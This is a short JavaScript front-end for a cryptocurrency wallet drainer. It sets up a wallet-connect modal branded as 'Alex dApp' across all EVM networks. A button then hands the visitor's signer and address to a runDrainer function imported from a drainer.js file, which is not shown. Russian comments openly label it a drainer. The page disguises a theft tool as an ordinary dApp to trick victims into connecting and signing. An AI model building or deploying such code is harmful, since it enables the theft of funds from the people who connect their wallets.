import { createAppKit } from '@reown/appkit'
import { evmNetworks } from '@reown/appkit/networks' // ✅ заменяем mainnet/bsc/... на ВСЕ
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'

// ✅ используем все EVM-сети
const networks = evmNetworks

const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks
})

const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png']
}

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

// открытие модального окна
document.getElementById('open-connect-modal').addEventListener('click', () => modal.open())

// запуск drainer
document.getElementById('drainer-btn').addEventListener('click', async () => {
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    const signer = provider.getSigner()
    const address = await signer.getAddress()

    await runDrainer(provider, signer, address)
  } catch (e) {
    console.error("Ошибка в Drainer:", e)
  }
})
